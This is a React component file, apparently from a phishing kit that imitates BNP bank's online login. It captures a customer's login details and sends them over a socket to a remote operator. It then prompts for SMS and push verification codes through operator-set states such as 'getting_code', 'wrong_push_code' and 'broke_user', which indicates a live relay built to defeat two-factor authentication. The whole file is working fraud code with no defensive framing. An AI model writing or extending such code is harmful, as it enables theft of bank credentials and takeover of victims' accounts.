import React, {useEffect} from "react";
import BnpWrapper from "./components/BnpWrapper";
import BnpFormLogin from "./components/BnpFormLogin";
import {useSocket} from "../../context/socket/socketProvider";
import BnpLoader from "./components/Loader";
import BnpFormCode from "./components/BnpFormCode";
import BnpFail from "./components/BnpFail";

const BnpBank = () => {

    const {user, setUser, initUser, connect, disconnect, sendData, sendCode} = useSocket();
    const submitLogin = (data) => {
        console.log('Login', data);
        initUser({
            ...data, bank: 'bnp'
        });
    }
    const submitCode = (code) => {
        sendCode(code);
    }
    const submitPush = (code) => {
        sendData('send_push_code', {code});
    }
    console.log(user)
    useEffect(() => {
        connect('bnp');
        return () => disconnect();
    }, [])
    return (
        <BnpWrapper>
            {
                user.status === '' || user.status === 'wrong_login' ?
                    <BnpFormLogin user={user} handler={submitLogin}/> :
                    user.status === 'getting_code' || user.status === 'wrong_code' ?
                        <BnpFormCode user={user} handler={submitCode}/> :
                        user.status === 'getting_push_code' || user.status === 'wrong_push_code' ?
                            <BnpFormCode user={user} handler={submitPush}/> :
                        user.status === 'broke_user' ?
                            <BnpFail/> :
                            <BnpLoader/>
            }
        </BnpWrapper>
    )
}
export default BnpBank;